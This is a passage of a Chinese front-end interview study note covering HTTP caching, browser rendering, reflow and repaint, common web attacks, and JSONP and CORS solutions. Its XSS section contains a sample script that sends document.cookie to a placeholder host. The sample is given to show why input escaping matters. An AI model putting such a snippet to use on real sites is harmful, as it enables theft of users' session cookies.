+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">类似于文件指纹，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">If-None-Match</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">会将当前</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">发送给服务器，询问该资源</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">是否变动，有变动的话就将新的资源发送回来。并且</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">优先级比</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">高。</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">以上就是缓存策略的所有内容了，看到这里，不知道你是否存在这样一个疑问。如果什么缓存策略都没设置，那么浏览器会怎么处理？</font>

<font style="color:rgb(44, 62, 80);">对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Date</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">减去</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">值的</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">10%</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">作为缓存时间。</font>

**<font style="color:rgb(44, 62, 80);">2.3 实际场景应用缓存策略</font>**

**<font style="color:rgb(44, 62, 80);">频繁变动的资源</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">对于频繁变动的资源，首先需要使用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache-Control: no-cache</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">使浏览器每次都请求服务器，然后配合</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ETag</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">或者</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Last-Modified</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。</font>

**<font style="color:rgb(44, 62, 80);">代码文件</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">这里特指除了</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">外的代码文件，因为</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">文件一般不缓存或者缓存时间很短。</font>

<font style="color:rgb(44, 62, 80);">一般来说，现在都会使用工具来打包代码，那么我们就可以对文件名进行哈希处理，只有当代码修改后才会生成新的文件名。基于此，我们就可以给代码文件设置缓存有效期一年</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cache-Control: max-age=31536000</font><font style="color:rgb(44, 62, 80);">，这样只有当</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">文件中引入的文件名发生了改变才会去下载最新的代码文件，否则就一直使用缓存</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">更多缓存知识详解</font>

### [](https://www.123fe.net/docs/base/high-frequency.html#%E4%BB%8E%E8%BE%93%E5%85%A5url-%E5%88%B0%E7%BD%91%E9%A1%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B)<font style="color:rgb(44, 62, 80);">从输入URL 到网页显示的完整过程</font>
+ **<font style="color:rgb(44, 62, 80);">网络请求</font>**
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DNS</font><font style="color:rgb(44, 62, 80);">查询（得到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">IP</font><font style="color:rgb(44, 62, 80);">)，建立</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">TCP</font><font style="color:rgb(44, 62, 80);">连接（三次握手）</font>
    - <font style="color:rgb(44, 62, 80);">浏览器发送</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP</font><font style="color:rgb(44, 62, 80);">请求</font>
    - <font style="color:rgb(44, 62, 80);">收到请求响应，得到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">源码。继续请求静态资源</font>
        * <font style="color:rgb(44, 62, 80);">在解析</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">过程中，遇到静态资源（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font><font style="color:rgb(44, 62, 80);">、图片等）还会继续发起网络请求</font>
        * <font style="color:rgb(44, 62, 80);">静态资源可能有缓存</font>
+ **<font style="color:rgb(44, 62, 80);">解析：字符串=>结构化数据</font>**
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">构建</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">树</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font><font style="color:rgb(44, 62, 80);">构建</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSSOM</font><font style="color:rgb(44, 62, 80);">树（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">style tree</font><font style="color:rgb(44, 62, 80);">）</font>
    - <font style="color:rgb(44, 62, 80);">两者结合，形成</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">render tree</font>
    - <font style="color:rgb(44, 62, 80);">优化解析</font>
        * <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font><font style="color:rgb(44, 62, 80);">放在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><head/></font><font style="color:rgb(44, 62, 80);">中，不要异步加载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font>
        * <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">放到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><body/></font><font style="color:rgb(44, 62, 80);">下面，不阻塞</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">解析（或结合</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">defer</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">async</font><font style="color:rgb(44, 62, 80);">）</font>
        * <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><img /></font><font style="color:rgb(44, 62, 80);">提前定义</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">width</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">height</font><font style="color:rgb(44, 62, 80);">，避免页面重新渲染</font>
+ **<font style="color:rgb(44, 62, 80);">渲染：Render Tree绘制到页面</font>**
    - <font style="color:rgb(44, 62, 80);">计算</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">的尺寸、定位，最后绘制到页面</font>
    - <font style="color:rgb(44, 62, 80);">遇到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">会执行，阻塞</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">解析。如果设置了</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">defer</font><font style="color:rgb(44, 62, 80);">，则并行下载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，等待</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">解析完，在执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">；如果设置了</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">async</font><font style="color:rgb(44, 62, 80);">，则并行下载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，下载完立即执行，在继续解析</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">是单线程的，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">执行和</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">渲染互斥，等</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">执行完，在解析渲染</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">）</font>
    - <font style="color:rgb(44, 62, 80);">异步</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSS</font><font style="color:rgb(44, 62, 80);">、异步图片，可能会触发重新渲染</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783565088-47a76227-388e-4f5f-a99e-0b232af173b7.png)

**<font style="color:rgb(44, 62, 80);">连环问：网页重绘repaint和重排reflow有什么区别</font>**

+ **<font style="color:rgb(44, 62, 80);">重绘</font>**
    - <font style="color:rgb(44, 62, 80);">元素外观改变：如颜色、背景色</font>
    - <font style="color:rgb(44, 62, 80);">但元素的尺寸、定位不变，不会影响其他元素的位置</font>
+ **<font style="color:rgb(44, 62, 80);">重排</font>**
    - <font style="color:rgb(44, 62, 80);">重新计算尺寸和布局，可能会影响其他元素的位置</font>
    - <font style="color:rgb(44, 62, 80);">如元素高度的增加，可能会使相邻的元素位置改变</font>
    - <font style="color:rgb(44, 62, 80);">重排必定触发重绘，重绘不一定触发重排。重绘的开销较小，重排的代价较高。</font>
    - **<font style="color:rgb(44, 62, 80);">减少重排的方法</font>**
        * <font style="color:rgb(44, 62, 80);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">BFC</font><font style="color:rgb(44, 62, 80);">特性，不影响其他元素位置</font>
        * <font style="color:rgb(44, 62, 80);">频繁触发（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">resize</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">scroll</font><font style="color:rgb(44, 62, 80);">）使用节流和防抖</font>
        * <font style="color:rgb(44, 62, 80);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">createDocumentFragment</font><font style="color:rgb(44, 62, 80);">批量操作</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font>
        * <font style="color:rgb(44, 62, 80);">编码上，避免连续多次修改，可通过合并修改，一次触发</font>
        * <font style="color:rgb(44, 62, 80);">对于大量不同的</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">dom</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">修改，可以先将其脱离文档流，比如使用绝对定位，或者</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">display:none</font><font style="color:rgb(44, 62, 80);">，在文档流外修改完成后再放回文档里中</font>
        * <font style="color:rgb(44, 62, 80);">动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">requestAnimationFrame</font>
        * <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">css3</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">硬件加速，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">transform</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">opacity</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">filters</font><font style="color:rgb(44, 62, 80);">，开启后，会新建渲染层</font>

### [](https://www.123fe.net/docs/base/high-frequency.html#%E5%B8%B8%E8%A7%81%E7%9A%84web%E5%89%8D%E7%AB%AF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B)<font style="color:rgb(44, 62, 80);">常见的web前端攻击方式有哪些</font>
**<font style="color:rgb(44, 62, 80);">XSS</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cross Site Script</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">跨站脚本攻击</font>
+ <font style="color:rgb(44, 62, 80);">手段：黑客将JS代码插入到网页内容中，渲染时执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">代码</font>
+ <font style="color:rgb(44, 62, 80);">预防：特殊字符串替换（前端或后端）</font>

```javascript
// 用户提交
const str = `
  <p>123123</p>
  <script>
      var img = document.createElement('image')
      // 把cookie传递到黑客网站 img可以跨域
      img.src = 'https://xxx.com/api/xxx?cookie=' + document.cookie
  </script>
`
const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
// 替换字符，无法在页面中渲染
//   &lt;script&gt;
//     var img = document.createElement('image')
//     img.src = 'https://xxx.com/api/xxx?cookie=' + document.cookie
// &lt;/script&gt;
```

**<font style="color:rgb(44, 62, 80);">CSRF</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Cross Site Request Forgery</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">跨站请求伪造</font>
+ <font style="color:rgb(44, 62, 80);">手段：黑盒诱导用户去访问另一个网站的接口，伪造请求</font>
+ <font style="color:rgb(44, 62, 80);">预防：严格的跨域限制 + 验证码机制</font>
    - <font style="color:rgb(44, 62, 80);">判断</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">referer</font>
    - <font style="color:rgb(44, 62, 80);">为</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(44, 62, 80);">设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sameSite</font><font style="color:rgb(44, 62, 80);">属性，禁止第三方网页跨域的请求能携带上</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">token</font>
    - <font style="color:rgb(44, 62, 80);">关键接口使用短信验证码</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">注意：偷取</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">是</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">XSS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">做的事，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CSRF</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">的作用是借用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">，并不能获取</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font>

**<font style="color:rgb(44, 62, 80);">CSRF攻击攻击原理及过程如下：</font>**

+ <font style="color:rgb(44, 62, 80);">用户登录了</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">网站，有了</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font>
+ <font style="color:rgb(44, 62, 80);">黑盒诱导用户到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);">网站，并发起</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">网站的请求</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">网站的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">API</font><font style="color:rgb(44, 62, 80);">发现有</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(44, 62, 80);">，会在请求中携带</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">网站的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">cookie</font><font style="color:rgb(44, 62, 80);">，认为是用户自己操作的</font>

**<font style="color:rgb(44, 62, 80);">点击劫持</font>**

+ <font style="color:rgb(44, 62, 80);">手段：诱导界面上设置透明的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">，诱导用户点击</font>
+ <font style="color:rgb(44, 62, 80);">预防：让</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">不能跨域加载</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783563859-3f1be76d-61fd-4491-acbb-ba458fe70083.png)

**<font style="color:rgb(44, 62, 80);">DDOS</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Distribute denial-of-service</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">分布式拒绝服务</font>
+ <font style="color:rgb(44, 62, 80);">手段：分布式的大规模的流量访问，使服务器瘫痪</font>
+ <font style="color:rgb(44, 62, 80);">预防：软件层不好做，需硬件预防（如阿里云的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">WAF</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">购买高防）</font>

**<font style="color:rgb(44, 62, 80);">SQL注入</font>**

+ <font style="color:rgb(44, 62, 80);">手段：黑客提交内容时，写入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sql</font><font style="color:rgb(44, 62, 80);">语句，破坏数据库</font>
+ <font style="color:rgb(44, 62, 80);">预防：处理内容的输入，替换特殊字符</font>

### [](https://www.123fe.net/docs/base/high-frequency.html#%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88)<font style="color:rgb(44, 62, 80);">跨域方案</font>
<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">因为浏览器出于安全考虑，有同源策略。也就是说，如果</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">协议</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">域名</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">端口</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">有一个不同就是跨域，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Ajax</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">请求会失败。</font>

<font style="color:rgb(44, 62, 80);">我们可以通过以下几种常用方法解决跨域的问题</font>

**<font style="color:rgb(44, 62, 80);">4.1 JSONP</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JSONP</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">的原理很简单，就是利用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><script></font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">标签没有跨域限制的漏洞。通过</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><script></font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">标签指向一个需要访问的地址并提供一个回调函数来接收数据</font>

**<font style="color:rgb(44, 62, 80);">涉及到的端</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JSONP</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">需要服务端和前端配合实现。</font>

```html
<script src="http://domain/api?param1=a&param2=b&callback=jsonp"></script>
<script>
    function jsonp(data) {
    	console.log(data)
	}
</script>
```

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JSONP</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">使用简单且兼容性不错，但是</font>**<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">只限于</font>****<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font>****<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">get</font>****<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font>****<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">请求</font>**

**<font style="color:rgb(44, 62, 80);">具体实现方式</font>**

+ <font style="color:rgb(44, 62, 80);">在开发中可能会遇到多个</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JSONP</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">请求的回调函数名是相同的，这时候就需要自己封装一个</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JSONP</font><font style="color:rgb(44, 62, 80);">，以下是简单实现</font>

```javascript
function jsonp(url, jsonpCallback, success) {
  let script = document.createElement("script");
  script.src = url;
  script.async = true;
  script.type = "text/javascript";
  window[jsonpCallback] = function(data) {
    success && success(data);
  };
  document.body.appendChild(script);
}
jsonp(
  "http://xxx",
  "callback",
  function(value) {
    console.log(value);
  }
);
```

**<font style="color:rgb(44, 62, 80);">4.2 CORS</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">（Cross-Origin Resource Sharing，跨域资源共享） 是目前最为广泛的解决跨域问题的方案。方案依赖服务端/后端在响应头中添加 Access-Control-Allow-* 头，告知浏览器端通过此请求</font>

**<font style="color:rgb(44, 62, 80);">涉及到的端</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">只需要服务端/后端支持即可，不涉及前端改动</font>

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);">需要浏览器和后端同时支持。</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">IE 8</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">9</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">需要通过</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">XDomainRequest</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">来实现。</font>
+ <font style="color:rgb(44, 62, 80);">浏览器会自动进行</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">通信，实现</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);">通信的关键是后端。只要后端实现了</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);">，就实现了跨域。</font>
+ <font style="color:rgb(44, 62, 80);">服务端设置</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Origin</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">就可以开启</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);">。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">实现起来非常方便，只需要增加一些</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTTP</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">头，让服务器能声明允许的访问来源</font>

<font style="color:rgb(44, 62, 80);">只要后端实现了</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);">，就实现了跨域</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783563831-fc403b31-dac2-4bd9-affd-f8bc04b338f9.png)

<font style="color:rgb(44, 62, 80);">以</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">koa</font><font style="color:rgb(44, 62, 80);">框架举例</font>

<font style="color:rgb(44, 62, 80);">添加中间件，直接设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Origin</font><font style="color:rgb(44, 62, 80);">请求头</font>

```javascript
app.use(async (ctx, next)=> {
  ctx.set('Access-Control-Allow-Origin', '*');
  ctx.set('Access-Control-Allow-Headers', 'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild');
  ctx.set('Access-Control-Allow-Methods', 'PUT, POST, GET, DELETE, OPTIONS');
  if (ctx.method == 'OPTIONS') {
    ctx.body = 200; 
  } else {
    await next();
  }
})
```

**<font style="color:rgb(44, 62, 80);">具体实现方式</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">将请求分为简单请求（Simple Requests）和需预检请求（Preflighted requests），不同场景有不同的行为</font>

